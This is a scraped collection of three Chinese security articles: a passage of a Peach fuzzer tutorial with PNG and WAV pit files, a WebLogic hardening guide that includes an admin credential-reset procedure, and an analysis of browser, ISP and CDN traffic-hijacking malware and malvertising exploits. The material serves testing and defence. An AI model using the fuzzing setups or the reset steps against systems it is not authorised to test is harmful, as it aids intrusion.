：占四字节，表示当前块的类型。一般是英文大小写字母的ASCII码（65～90或者97～122）5.Data：数据区。大小可以是0字节6.CRC：占四个字节，整个chunk的CRC校验码（Length+Type+Data）有了之前的经验，不难写出如下的PNG DataModel：&lt;!-- 定义Chunk的数据结构 --&gt;&lt;DataModel name=""Chunk""&gt;&lt;!-- Chunk第一部分：uint32 length --&gt;&lt;Number name=""Length"" size=""32"" signed=""false"" endian=""big""&gt;&lt;Relation type=""size"" of=""Data""/&gt;&lt;/Number&gt;&lt;!-- Chunk第二和第三部分：type code,4个英文字母；由第一部分length指定长度的Data块--&gt;&lt;Block name=""TypeAndData""&gt;&lt;String name=""Type"" length=""4""/&gt;&lt;Blob name=""Data""/&gt;&lt;/Block&gt;&lt;!-- Chunk第四部分：crc校验码 --&gt;&lt;Number name=""CRC"" size=""32"" endian=""big""&gt;&lt;Fixup class=""Crc32Fixup""&gt;&lt;Param name=""ref"" value=""TypeAndData""/&gt;&lt;/Fixup&gt;&lt;/Number&gt;&lt;/DataModel&gt;&lt;!-- 将PNG文件视为一个8字节签名+若干个Chunk --&gt;&lt;DataModel name=""Png""&gt;&lt;Blob name=""pngSignature"" valueType=""hex"" value=""89 50 4E 47 0D 0A 1A 0A"" token=""true""/&gt;&lt;Block ref=""Chunk"" minOccurs=""1"" maxOccurs=""1024""/&gt;&lt;/DataModel&gt;接下来就是StateModel部分，这里以一款名为pngcheck的轻量级可执行程序来打开png文件，下载链接&lt;!-- StateModel完成三件事：修改文件生成畸形文件；把该文件关闭；调用pngcheck打开生成的畸形文件； --&gt;&lt;StateModel name=""TheState"" initialState=""Initial""&gt;&lt;State name=""Initial""&gt;&lt;!-- 输出png文件 --&gt;&lt;Action type=""output""&gt;&lt;DataModel ref=""Png""/&gt;&lt;!-- 读入png文件 --&gt;&lt;Data name=""data"" fileName=""D:\code\peach\PNG\circle.png""/&gt;&lt;/Action&gt;&lt;!-- 关闭png文件 --&gt;&lt;Action type=""close""/&gt;&lt;!-- 调用pngcheck进程 --&gt;&lt;Action type=""call"" method=""D:\software\pngcheck-2.3.0-win32\pngcheck.exe"" publisher=""Peach.Agent""&gt;&lt;!-- Param用来存放传递给pngcheck.exe的参数，即畸形文件的文件名 --&gt;&lt;Param name=""png file"" type=""in""&gt;&lt;DataModel ref=""Param""/&gt;&lt;!-- 定义输出文件 --&gt;&lt;Data name=""filename""&gt;&lt;Field name=""value"" value=""D:\code\peach\PNG\fuzzedCircle.png""/&gt;&lt;/Data&gt;&lt;/Param&gt;&lt;/Action&gt;&lt;/State&gt;&lt;/StateModel&gt;现在我们为Peach Pit加上测试：&lt;Test name=""Default""&gt;&lt;StateModel ref=""TheState""/&gt;&lt;Publisher class=""File""&gt;&lt;Param name=""FileName"" value=""D:\code\peach\PNG\fuzzedCircle.png""/&gt;&lt;/Publisher&gt;&lt;/Test&gt;到这里已经可以运行测试了，不过这样子只会生成畸形文件，对于实际应用并没有什么用处。只有加上Agent和Monitor，对分析结果进行监控和日志记录才是最终需要的。 因为作者使用的是Win平台，所以调用的 class 就是 WinAgent了，其他平台的可以做出相应变换。&lt;Agent name=""WinAgent""&gt;&lt;Monitor class=""WindowsDebugger""&gt;&lt;Param name=""CommandLine"" value=""D:\Software\pngcheck-2.3.0-win32\pngcheck.exe D:\code\peach\PNG\fuzzedCircle.png"" /&gt;&lt;!-- 可以用name值为WinDbgPath的Param来手动指定Windbg的位置 --&gt;&lt;!-- 删除LaunchViewer可以不调用GUI界面加快运行速度 --&gt;&lt;Param name=""StartOnCall"" value=""LaunchViewer"" /&gt;&lt;Param name=""CpuKill"" value=""true"" /&gt;&lt;/Monitor&gt;&lt;Monitor class=""PageHeap""&gt;&lt;Param name=""Executable"" value=""D:\Software\pngcheck-2.3.0-win32\pngcheck.exe""/&gt;&lt;/Monitor&gt;&lt;/Agent&gt;至此基本就大功告成了，运行一下看看： 16339781.png0×6 举一反三：WAV格式Peach Pit编写为了更好地帮助大家巩固以上知识，再给出一个完整的WAV Peach Pit（基于版本3）： WAV文件格式： Pit：&lt;?xml version=""1.0"" encoding=""utf-8""?&gt;&lt;Peach xmlns=""http://peachfuzzer.com/2012/Peach"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""xsi:schemaLocation=""http://peachfuzzer.com/2012/Peach ../peach.xsd""&gt;&lt;Defaults&gt;&lt;Number signed=""false"" /&gt;&lt;/Defaults&gt;&lt;!-- 定义WAV文件格式 --&gt;&lt;DataModel name=""Wav""&gt;&lt;!-- Wav header --&gt;&lt;String value=""RIFF"" token=""true"" /&gt;&lt;Number size=""32"" /&gt;&lt;String value=""WAVE"" token=""true"" /&gt;&lt;/DataModel&gt;&lt;!-- 定义一般的wave区块，作为基类，之后会经常被ref引用 --&gt;&lt;DataModel name=""Chunk""&gt;&lt;!-- RIFF --&gt;&lt;String name=""ID"" length=""4"" padCharacter="" "" /&gt;&lt;!-- Data length in bytes，4字节，其值=总文件大小-8字节 --&gt;&lt;Number name=""Size"" size=""32""&gt;&lt;Relation type=""size"" of=""Data"" /&gt;&lt;/Number&gt;&lt;!-- 除去RIFF文件头和data length共8个字节后面的所有数据 --&gt;&lt;Blob name=""Data"" /&gt;&lt;Padding alignment=""16"" /&gt;&lt;/DataModel&gt;&lt;DataModel name=""ChunkFmt"" ref=""Chunk""&gt;&lt;String name=""ID"" value=""fmt "" token=""true""/&gt;&lt;Block name=""Data""&gt;&lt;Number name=""CompressionCode"" size=""16"" /&gt;&lt;Number name=""NumberOfChannels"" size=""16"" /&gt;&lt;Number name=""SampleRate"" size=""32"" /&gt;&lt;Number name=""AverageBytesPerSecond"" size=""32"" /&gt;&lt;Number name=""BlockAlign"" size=""16"" /&gt;&lt;Number name=""SignificantBitsPerSample"" size=""16"" /&gt;&lt;Number name=""ExtraFormatBytes"" size=""16"" /&gt;&lt;Blob name=""ExtraData"" /&gt;&lt;/Block&gt;&lt;/DataModel&gt;&lt;DataModel name=""ChunkData"" ref=""Chunk""&gt;&lt;String name=""ID"" value=""data"" token=""true""/&gt;&lt;/DataModel&gt;&lt;DataModel name=""ChunkFact"" ref=""Chunk""&gt;&lt;String name=""ID"" value=""fact"" token=""true""/&gt;&lt;Block name=""Data""&gt;&lt;Number size=""32"" /&gt;&lt;Blob/&gt;&lt;/Block&gt;&lt;/DataModel&gt;&lt;DataModel name=""ChunkSint"" ref=""Chunk""&gt;&lt;String name=""ID"" value=""sInt"" token=""true""/&gt;&lt;Block name=""Data""&gt;&lt;Number size=""32"" /&gt;&lt;/Block&gt;&lt;/DataModel&gt;&lt;DataModel name=""ChunkWavl"" ref=""Chunk""&gt;&lt;String name=""ID"" value=""wavl"" token=""true""/&gt;&lt;Block name=""Data""&gt;&lt;Block name=""ArrayOfChunks"" maxOccurs=""3000""&gt;&lt;Block ref=""ChunkSint""/&gt;&lt;Block ref=""ChunkData"" /&gt;&lt;/Block&gt;&lt;/Block&gt;&lt;/DataModel&gt;&lt;DataModel name=""ChunkCue"" ref=""Chunk""&gt;&lt;String name=""ID"" value=""cue "" token=""true""/&gt;&lt;Block name=""Data""&gt;&lt;Block name=""ArrayOfCues"" maxOccurs=""3000""&gt;&lt;String length=""4"" /&gt;&lt;Number size=""32"" /&gt;&lt;String length=""4"" /&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;/Block&gt;&lt;/Block&gt;&lt;/DataModel&gt;&lt;DataModel name=""ChunkPlst"" ref=""Chunk""&gt;&lt;String name=""ID"" value=""plst"" token=""true""/&gt;&lt;Block name=""Data""&gt;&lt;Number name=""NumberOfSegments"" size=""32"" &gt;&lt;Relation type=""count"" of=""ArrayOfSegments""/&gt;&lt;/Number&gt;&lt;Block name=""ArrayOfSegments"" maxOccurs=""3000""&gt;&lt;String length=""4"" /&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;/Block&gt;&lt;/Block&gt;&lt;/DataModel&gt;&lt;DataModel name=""ChunkLabl"" ref=""Chunk""&gt;&lt;String name=""ID"" value=""labl"" token=""true""/&gt;&lt;Block name=""Data""&gt;&lt;Number size=""32"" /&gt;&lt;String nullTerminated=""true"" /&gt;&lt;/Block&gt;&lt;/DataModel&gt;&lt;DataModel name=""ChunkNote"" ref=""ChunkLabl""&gt;&lt;String name=""ID"" value=""note"" token=""true""/&gt;&lt;/DataModel&gt;&lt;DataModel name=""ChunkLtxt"" ref=""Chunk""&gt;&lt;String name=""ID"" value=""ltxt"" token=""true""/&gt;&lt;Block name=""Data""&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""16"" /&gt;&lt;Number size=""16"" /&gt;&lt;Number size=""16"" /&gt;&lt;Number size=""16"" /&gt;&lt;String nullTerminated=""true"" /&gt;&lt;/Block&gt;&lt;/DataModel&gt;&lt;DataModel name=""ChunkList"" ref=""Chunk""&gt;&lt;String name=""ID"" value=""list"" token=""true""/&gt;&lt;Block name=""Data""&gt;&lt;String value=""adtl"" token=""true"" /&gt;&lt;Choice maxOccurs=""3000""&gt;&lt;Block ref=""ChunkLabl""/&gt;&lt;Block ref=""ChunkNote""/&gt;&lt;Block ref=""ChunkLtxt""/&gt;&lt;Block ref=""Chunk""/&gt;&lt;/Choice&gt;&lt;/Block&gt;&lt;/DataModel&gt;&lt;DataModel name=""ChunkSmpl"" ref=""Chunk""&gt;&lt;String name=""ID"" value=""smpl"" token=""true""/&gt;&lt;Block name=""Data""&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;Block maxOccurs=""3000""&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;Number size=""32"" /&gt;&lt;/Block&gt;&lt;/Block&gt;&lt;/DataModel&gt;&lt;DataModel name=""ChunkInst"" ref=""Chunk""&gt;&lt;String name=""ID"" value=""inst"" token=""true""/&gt;&lt;Block name=""Data""&gt;&lt;Number size=""8""/&gt;&lt;Number size=""8""/&gt;&lt;Number size=""8""/&gt;&lt;Number size=""8""/&gt;&lt;Number size=""8""/&gt;&lt;Number size=""8""/&gt;&lt;Number size=""8""/&gt;&lt;/Block&gt;&lt;/DataModel&gt;&lt;DataModel name=""Wav""&gt;&lt;!-- wave header --&gt;&lt;String value=""RIFF"" token=""true"" /&gt;&lt;Number size=""32"" /&gt;&lt;String value=""WAVE"" token=""true""/&gt;&lt;/DataModel&gt;&lt;!-- Defines the format of a WAV file --&gt;&lt;DataModel name=""Wav""&gt;&lt;!-- wave header --&gt;&lt;String value=""RIFF"" token=""true"" /&gt;&lt;Number size=""32"" /&gt;&lt;String value=""WAVE"" token=""true""/&gt;&lt;Choice maxOccurs=""30000""&gt;&lt;Block ref=""ChunkFmt""/&gt;&lt;Block ref=""ChunkData""/&gt;&lt;Block ref=""ChunkFact""/&gt;&lt;Block ref=""ChunkSint""/&gt;&lt;Block ref=""ChunkWavl""/&gt;&lt;Block ref=""ChunkCue""/&gt;&lt;Block ref=""ChunkPlst""/&gt;&lt;Block ref=""ChunkLtxt""/&gt;&lt;Block ref=""ChunkSmpl""/&gt;&lt;Block ref=""ChunkInst""/&gt;&lt;Block ref=""Chunk""/&gt;&lt;/Choice&gt;&lt;/DataModel&gt;&lt;StateModel name=""TheState"" initialState=""Initial""&gt;&lt;State name=""Initial""&gt;&lt;!-- 输出Wav文件 --&gt;&lt;Action type=""output""&gt;&lt;DataModel ref=""Wav""/&gt;&lt;!-- 待读取的文件 --&gt;&lt;Data fileName=""sample.wav""/&gt;&lt;/Action&gt;&lt;Action type=""close""/&gt;&lt;!-- 调用MPlayer --&gt;&lt;Action type=""call"" method=""StartMPlayer"" publisher=""Peach.Agent"" /&gt;&lt;/State&gt;&lt;/StateModel&gt;&lt;Agent name=""WinAgent""&gt;&lt;Monitor class=""WindowsDebugger""&gt;  &lt;!-- The command line to run. Notice the filename provided matched upto what is provided below in the Publisher configuration --&gt;&lt;Param name=""CommandLine"" value=""c:\\mplayer\\mplayer.exe fuzzed.wav"" /&gt;&lt;!-- This parameter will cause the debugger to wait for an action-call inthe state model with a method=""StartMPlayer"" before runningprogram.--&gt;&lt;Param name=""StartOnCall"" value=""StartMPlayer"" /&gt;&lt;!-- This parameter will cause the monitor to terminate the processonce the CPU usage reaches zero.--&gt;&lt;Param name=""CpuKill"" value=""true""/&gt;&lt;/Monitor&gt;&lt;!-- Enable heap debugging on our process as well. --&gt;&lt;Monitor class=""PageHeap""&gt;&lt;Param name=""Executable"" value=""c:\\mplayer\\mplayer.exe""/&gt;&lt;/Monitor&gt;&lt;/Agent&gt;&lt;Test name=""Default""&gt;&lt;Agent ref=""WinAgent"" platform=""windows""/&gt;&lt;Agent ref=""LinAgent"" platform=""linux""/&gt;&lt;Agent ref=""OsxAgent"" platform=""osx""/&gt;&lt;StateModel ref=""TheState""/&gt;&lt;Publisher class=""File""&gt;&lt;Param name=""FileName"" value=""fuzzed.wav""/&gt;&lt;/Publisher&gt;&lt;Logger class=""Filesystem""&gt;&lt;Param name=""Path"" value=""logs"" /&gt;&lt;/Logger&gt;&lt;/Test&gt;0×7 后记文件格式复杂多变，良好的开端是成功的一半。PeachPit的编写通常是一个细致而又复杂的过程，只有耐心+经验，才能成功写出一个完美的Pit文件。","2016-11-28 11:22:54","安全工具","深入探究文件Fuzz工具之Peach实战","http://nsoad.com/Security-tools/20161128/tools-852.html"
"5ccbfb164f2f0a0a7a69c112","*本文原创作者：shewey，本文属FreeBuf原创奖励计划，未经许可禁止转载1、引言前段时间Java的反序列化漏洞吵得沸沸扬扬，因工作原因需要对weblogic进行安全配置，网上关于w","blackhold","*本文原创作者：shewey，本文属FreeBuf原创奖励计划，未经许可禁止转载1、引言前段时间Java的反序列化漏洞吵得沸沸扬扬，因工作原因需要对weblogic进行安全配置，网上关于weblogic的安全配置的内容都不是很全面，可能是因为weblogic已经比较成熟了吧。本文就总结一下在整个过程中遇到的一些坑，并给出正确的姿势。2、密码复杂度及更改周期策略默认在安装时，weblogic要求密码至少为8位，但是没有限制密码复杂度。因此需要在安装时手工设置复杂的密码，weblogic11g时设置如下的密码：“We8_Q7%*5@1@Oracle”。WLST（Weblogic Scripting Tool）weblogic脚本工具，如果你不想在console操作修改Weblogic的相关配置，可以试试用WLST。可以用它来监视和管理Weblogic Server实例以及域。Weblogic9.2版本中”C:\bea\weblogic92\common\bin\wlst.cmd”为WLST脚本工具。Weblogic11g版本中在如下位置：如果已经采用了默认的weblogic弱口令，则需要对密码进行修改，具体修改步骤如下：1）登陆console管理控制台，修改密码。选择“ base_domain”-&gt;“Environment” -&gt; “ Security Realms” -&gt;”Users and Groups” -&gt;“Passwords”，然后修改密码。2）重启weblogicbase_domain域服务当你重启weblogic后就会发现，weblogic报错。错误信息主要是因为boot.properties的文件中的密码与新设置的密码不一致导致的，所以在这里我们把这个配置文件重设一下就可以了。具体路径：C:\bea\user_projects\domains\base_domain\servers\AdminServer\security\boot.properties将文件里的username和password改为我们的新密码，在这里不要担心明文会造成不安全因素，在下次重启时，就会自动被weblogic用3DES加密的。3）更改boot.properties**用户名和密码**修改密码。4）重启weblogicbase_domain域服务后正常访问。3、启用管理端口登录控制台后点击“Domain Structure”，在“Settings for base_domain”配置页面的选择选项卡“Configuration”-&gt;” General”。EnableAdministration Port：管理端口启用安全管理控制台端口和URL路径的步骤：1）登录weblogic管理控制台在管理控制台中勾选管理端口，点击激活更改。2）重启服务尝试通过https://localhost:9002/console访问weblogic管理控制台。4、日志安全配置Weblogic日志主要分为SERVER运行日志、HTTP访问日志、DOMAIN运行日志。其中SERVER运行日志、HTTP访问日志可以通过Weblogic后台图形化界面进行配置。SERVER运行日志：WebLogic SERVER在启动或运行过程中有错误发生，错误信息会显示在屏幕上，并且会记录在一个LOG文件中，该文件默认名为AdminServer.log。该文件也记录WebLogic的启动及关闭等其他运行信息。可在General属性页中设置该文件的路径及名字，错误的输出的等级等。每条日志消息都具有关联的严重程度级别。日志消息的级别大致说明其重要级别或紧急级别。WebLogic Server 具有从 TRACE 到 EMERGENCY 的预定义严重程度，在将日志请求调度给记录器时，会将对应严重程度转换为日志级别。日志级别对象可以指定下列按照最小影响到最大影响的顺序排列的任意值：TRACE、DEBUG、INFO、NOTICE、WARNING、ERROR、CRITICAL、ALERT、EMERGENCY可以在记录器和处理程序上设置日志严重程度级别。在记录器上进行设置时，任何处理程序都不会收到记录器已拒绝的事件。例如，如果在记录器上将日志级别设置为 NOTICE，则任何处理程序都不会收到 INFO 级别的事件。在处理程序上设置日志级别时，仅会对处理程序应用限制，而不会对其他程序应用限制。例如，为文件处理程序关闭 DEBUG 意味着不会将任何 DEBUG 消息写入日志文件，但会将 DEBUG 消息将写入标准输出。HTTP访问日志：在WebLogic中可以对用HTTP，HTTPS协议访问的服务器上的文件都做记录，该LOG文件默认的名字为Access.log,内容如下，该文件具体记录在某个时间，某个IP地址的客户端访问了服务器上的那个文件。DOMAIN运行日志：记录一个DOMIAN的运行情况，一个DOMAIN中的各个WebLogic SERVER可以把它们的一些运行信息（比如：很严重的错误）发送给一个DOMAIN的Administratior SERVER上，Administratior SERVER把这些信息些到DOMAIN 日志中。默认名为：domain_name.log1)登录控制台后查看“Domain Structure”-&gt;“Environment”-&gt;“Servers”选项，选择”AdminServer(admin)”，点击“Logging”选项卡，对General和http进行设置，具体设置如下所示：1)登录控制台后查看“DomainStructure”-&gt;” Configuration”-&gt;“logging”选项，对domain进行设置，具体设置如下所示：5、最小化安装1）禁止采用默认weblogic作为管理员用户名，建议采用不易被猜测的用户名，如“root_domain”等。2）禁止采用示例应用6、管理控制台访问地址限制以及关闭管理控制台登录控制台后点击“Domain Structure”，在“Settings for base_domain”配置页面的选择选项卡“Configuration”-&gt;” General”，点击Advanced按钮，查看配置情况：当然除了上述方法还可以通过修改配置文件关闭管理控制台。1）选择domain-&gt;configuration-&gt;General选项卡，点击Advanced option更改如下参数：2）去掉被选中的“ConsoleEnabled”选项，然后保存，并激活配置；默认开启状态下的config.xml配置文件如上所示。关闭管理控制台的config.xml配置参数，如上图所示。3）重启服务后，再次访问管理控制台，出现“Error 404–Not Found”。一旦关闭管理控制台后如何进行开启呢？| 1、修改config.xml配置文件：true admin console-ext || — || 2、重新启动domain服务 |7、重建weblogic用户名及密码忘记了weblogic server的管理员密码，可以通过如下的方式来重置weblogic的密码。1）为了保证操作安全，备份%DOMAIN_HOME%/security（C:\bea\user_projects\domains\base_domain\security）主域目录的如下文件夹的所有文件，如DefaultAuthenticatorInit.ldift。2）进入%DOMAIN_HOME%/security目录，执行下列命令：| 运行java -cp/usr/local/bea/weblogic92/server/lib/weblogic.jar weblogic.security.utils.AdminAccount &lt;新用户名&gt; &lt;新密码&gt; .注意最后有个“ .”，一个空格和一个点：执行完后在当前目录会生成一个新的DefaultAuthenticatorInit.ldift文件，然后替换原来的/security/DefaultAuthenticatorInit.ldift文件。 || — |重建DefaultAuthenticatorInit.ldift文件，如上图所示，并且文件生成如下图所示：3）进入管理服务器的security目录。cd %DOMAIN_HOME%/servers/AdminServer。将其中的data目录重命名，如：data_old，或者备份到别的地方。4）进入../AdminServer/security 目录删除boot.properties。重新新建：boot.properties，增加如下内容：username=adminuserpassword=weblogic重建boot.properties密码文件5）完成后会发现，管理控制台密码被修改且用户名已经被替换成adminuser。3、总结上述仅仅是考虑了单机模式weblogic的安全配置方式，不足之处还望大家多多指点。*本文原创作者：shewey，本文属FreeBuf原创奖励计划，未经许可禁止转载","2016-08-18 09:15:05","网络安全","weblogic安全配置二三事","http://nsoad.com/Article/Network-security/20160818/310.html"
"5ccbfb164f2f0a0a7a69c113","在鼠标点击的一刹那，流量在用户系统中流过层层节点，在路由的指引下奔向远方的服务器。这段路程中，短兵相接的战斗往往是最激烈的，在所有流量可能路过的....","猎豹渔村安全局","混乱不是深渊,混乱是阶梯——《权力的游戏》在鼠标点击的一刹那，流量在用户系统中流过层层节点，在路由的指引下奔向远方的服务器。这段路程中，短兵相接的战斗往往是最激烈的，在所有流量可能路过的节点，往往都潜伏着劫持者，他们劫持流量的手段也层出不穷，从主页配置篡改、hosts劫持、进程Hook、启动劫持、LSP注入、浏览器插件劫持、HTTP代理过滤、内核数据包劫持、bootkit等等不断花样翻新。或许从你按下开机按钮的一瞬间，流量劫持的故事就已经开始了。一 、本地流量劫持1、道貌岸然的流氓软件“网址导航”堪称国内互联网最独特的一道风景线，从hao123开始发扬光大，各大导航站开始成为互联网流量最主要的一个入口点，伴随着的是围绕导航主页链接的小尾巴(推广ID)，展开的一场场惊心动魄的攻防狙击战。一方面国内安全软件对传统IE浏览器的主页防护越来越严密， 另一方面用户体验更好的第三方浏览器开始占据主流地位，国内的流氓木马为了谋求导航量也开始“另辟蹊径”。 下面讲到的案例是我们曾经捕获到的一批导航主页劫持样本，历史活跃期最早可以追溯到2014年，主要通过多类流氓软件捆绑传播，其劫持功能模块通过联网更新获取，经过多层的内存解密后再动态加载。其中的主页劫持插件模块通过修改浏览器配置文件实现主页篡改，对国内外的chrome、火狐、safari、傲游、qq、360、搜狗等20余款主流浏览器做到了全部覆盖。实现这些功能显然需要对这批浏览器的配置文件格式和加密算法做逆向分析，在样本分析过程中我们甚至发现其利用某漏洞绕过了其中2款浏览器的主页保护功能，流氓作者可谓非常“走心”，可惜是剑走偏锋。[1] 某软件下拉加载主页劫持插件上图就是我们在其中一款软件中抓取到的主页劫持模块文件和更新数据包，可能你对数据包里这个域名不是很熟悉，但是提到“音速启动”这款软件相信安全圈内很多人都会有所了解，当年各大安全论坛的工具包基本上都是用它来管理配置的，伴随了很多像本文作者这样的三流小黑客的学习成长，所以分析这个样本过程中还是有很多感触的，当然这些木马劫持行为可能和原作者没有太大关系，听说这款软件在停止更新几年后卖给了上海某科技公司，其旗下多款软件产品都曾被发现过流氓劫持行为，感兴趣的读者可以自行百度，这里不再进行更多的披露。正如前面的案例，一部分曾经的老牌软件开始慢慢变质，离用户渐行渐远；另一方面，随着最近几年国内安全环境的转变，之前流行的盗号、下载者、远控等传统木马日渐式微，另外一大批披着正规软件外衣的流氓也开始兴起，他们的运作方式有以下几个特点：冒充正规软件，但实际功能单一简陋，有些甚至是空壳软件，常见的诸如某某日历、天气预报、色播、输入法等五花八门的伪装形式，企图借助这些正常功能的外衣逃避安全软件的拦截，实现常驻用户系统的目的。背后行为与木马病毒无异，其目的还是为了获取推广流量，如主页锁定，网页劫持、广告弹窗、流量暗刷、静默安装等等。而且其中很大一部分流氓软件的恶意模块和配置都通过云端进行下拉控制，可以做到分时段、分地区、分场景进行投放触发。[2] 某流氓软件的云端控制变种速度比较快，屡杀不止，被安全软件拦截清理后很快就会更换数字签名，甚至换个软件外壳包装后卷土重来。这些数字签名注册的企业信息很多都是流氓软件作者从其他渠道专门收购的。 [3]某流氓软件1个月内多次更换数字签名证书逃避安全软件查杀下面可以通过几个典型案例了解下这些流氓软件进行流量劫持的技术手法：1） 通过浏览器插件进行流量劫持的QTV系列变种，该样本针对IE浏览器通过BHO插件在用户网页中注入JS脚本，针对chrome内核的浏览器利用漏洞绕过了部分浏览器插件的正常安装步骤，通过篡改配置文件添加浏览器插件实现动态劫持。 [4]被静默安装到浏览器中的插件模块，通过JS注入劫持网页通过注入JS脚本来劫持用户网页浏览的技术优点也很明显，一方面注入的云端JS脚本比较灵活，可以随时在云端控制修改劫持行为，另一方面对于普通用户来说非常隐蔽，难以察觉。被注入用户网页的JS脚本的对网页浏览中大部分的推广流量都进行了劫持，如下图：[5] 在网页中注入JS劫持推广流量2） 下面这个“高清影视流氓病毒”案例是去年曾深入跟踪的一个流氓病毒传播团伙，该类样本主要伪装成播放器类的流氓软件进行传播，技术特点如下图所示，大部分劫持模块都是驱动文件，通过动态内存加载到系统内核，实现浏览器劫持、静默推广等病毒行为。[6] “高清影视”木马劫持流程简图从木马后台服务器取证的文件来看，该样本短期内传播量非常大，单日高峰达到20w+，一周累计感染用户超过100万，安装统计数据库每天的备份文件都超过1G。[7] “高清影视”木马后台服务器取证2. 持续活跃的广告弹窗挂马提到流量劫持，不得不说到近2年时间内保持高度活跃的广告弹窗挂马攻击案例，原本的广告流量被注入了网页木马，以广告弹窗等形式在客户端触发，这属于一种变相的流量劫持，更确切的说应该称之为“流量污染”或“流量投毒”，这里我们将其归类为本地劫持。近期挂马利用的漏洞多为IE神洞(cve-2014-6332)和HackingTeam泄漏的多个Flash漏洞。通过网页挂马，流量劫持者将非常廉价的广告弹窗流量转化成了更高价格的安装量，常见的CPM、CPV等形式的广告流量每1000用户展示只有几元钱的成本，假设网页挂马的成功率有5%，这意味着劫持者获取到20个用户的安装量，平均每个用户静默安装5款软件，劫持者的收益保守估计有50元，那么“广告流量投毒”的利润率就近10倍。这应该就是近两年网页挂马事件频发背后的最大源动力。8] 网页木马经常使用的IE神洞(CVE-2014-6332) [9] 网页木马利用IE浏览器的res协议检测国内主流安全软件这些广告流量大多来自于软件弹窗、色情站点、垃圾站群、运营商劫持量等等，其中甚至不乏很多知名软件的广告流量，从我们的监测数据中发现包括酷狗音乐、搜狐影音、电信管家、暴风影音、百度影音、皮皮影音等多家知名软件厂商的广告流量被曾被劫持挂马。正是因为如此巨大的流量基数，所以一旦发生挂马事件，受到安全威胁的用户数量都是非常巨大的。[10] 对利用客户端弹窗挂马的某病毒服务器取证发现的flash漏洞exp据了解很多软件厂商对自身广告流量的管理监控都存在漏洞，有些甚至经过了多层代理分包，又缺乏统一有力的安全审核机制，导致被插入网页木马的“染毒流量”被大批推送到客户端，最终导致用户系统感染病毒。在样本溯源过程中，我们甚至在某知名音乐软件中发现一个专门用于暗刷广告流量的子模块。用户越多责任越大，且行且珍惜。[11] 2015年某次挂马事件涉及的弹窗客户端进程列表 [12] 对2015年度最活跃的某挂马服务器的数据库取证(高峰期每小时5k+的安装量)二、网络劫持流量劫持的故事继续发展，当一个网络数据包成功躲开了本地主机系统上的层层围剿，离开用户主机穿行于各个路由网关节点，又开启了一段新的冒险之旅。在用户主机和远程服务器之间的道路同样是埋伏重重，数据包可能被指引向错误的终点(DNS劫持)，也可能被半路冒名顶替(302重定向)，或者直接被篡改(HTTP注入)。1. 运营商劫持提起网络劫持，往往第一个想起的就是运营商劫持，可能每一个上网的用户或多或少都曾经遇到过，电脑系统或手机用安全软件扫描没有任何异常，但是打开正常网页总是莫名其妙弹出广告或者跳转到其他网站。对普通用户来说这样的行为可以说深恶痛绝，企业和正规网站同样也深受其害，正常业务和企业形象都会受到影响，在15年年底，腾讯、小米、微博等6家互联网公司共同发表了一篇抵制运营商流量劫持的联合声明。在我们日常的安全运营过程中也经常接到疑似运营商劫持的用户反馈，下面讲述一个非常典型的http劫持跳转案例，用户反馈打开猎豹浏览器首页点击下载就会弹出广告页面，经过我们的检测发现用户的网络被运营商劫持，打开网页的数据包中被注入了广告劫持代码。类似的案例还有很多，除了明面上的广告弹窗，还有后台静默的流量暗刷。对于普通用户来说，可能只有运营商客服投诉或工信部投诉才能让这些劫持行为稍有收敛。[13] 用户打开网页的数据包被注入广告代码[14] 用户任意点击网页触发广告弹窗跳转到“6间房”推广页面这个案例劫持代码中的域名“abc.ss229.com”归属于推广广告联盟，在安全论坛和微博已有多次用户反馈，其官网号称日均PV达到2.5亿。其实运营商劫持流量的买卖其实已是圈内半公开的秘密，结合对用户上网习惯的分析，可以实现对不同地区、不同群体用户的精准定制化广告推送，感兴趣的读者可以自行搜索相关的QQ群。[15] 公开化的运营商劫持流量买卖缺乏安全保护的DNS协议和明文传输的HTTP流量非常容易遭到劫持，而运营商占据网络流量的必经之路，在广告劫持技术上具有先天优势，比如常见的分光镜像技术，对于普通用户和厂商来说对抗成本相对较高，另一方面国内主流的搜索引擎、导航站点、电商网站都已经开始积极拥抱更加安全的https协议，这无疑是非常可喜的转变。[16] 常用于运营商流量劫持的分光镜像技术乌云平台上（目前一直在升级，恩 -_-||）也曾多次曝光运营商流量劫持的案例，例如曾经被用户举报的案例“下载小米商城被劫持到UC浏览器APP”，感谢万能的白帽子深入某运营商劫持平台系统为我们揭秘内幕。[17] 被曝光的某运营商apk下载分发劫持的管理后台以上种种，不得不让人想起“打劫圈”最富盛名的一句浑语，“此山是我开,此树是我栽,要想过此路,留下买路财”，“买网络送广告”已经成为网络运营商的标准套餐。这些劫持流量的买卖显然不仅仅是所谓的“个别内部员工违规操作”，还是那句话，用户越多责任越大，且行且珍惜。2. CDN缓存污染CDN加速技术本质上是一种良性的DNS劫持，通过DNS引导将用户对服务器上的js、图片等不经常变化的静态资源的请求引导到最近的服务器上，从而加速网络访问。加速访问的良好用户体验使CDN加速被各大网站广泛使用，其中蕴含的惊人流量自然也成为流量劫持者的目标。 [18] 打开正常网页后跳转到“色播”诱导页面去年我们曾多次接到用户反馈使用手机浏览器打开网页时经常被跳转到色情推广页面，经过抓包分析，发现是由于百度网盟CDN缓存服务器中的关键JS文件被污染注入广告代码，劫持代码根据user-agent头判断流量来源后针对PC、Android、iOS等平台进行分流弹窗，诱导用户安装“伪色播”病毒APP。[19] 抓包分析显示百度网盟的公共JS文件被注入广告代码 [20] 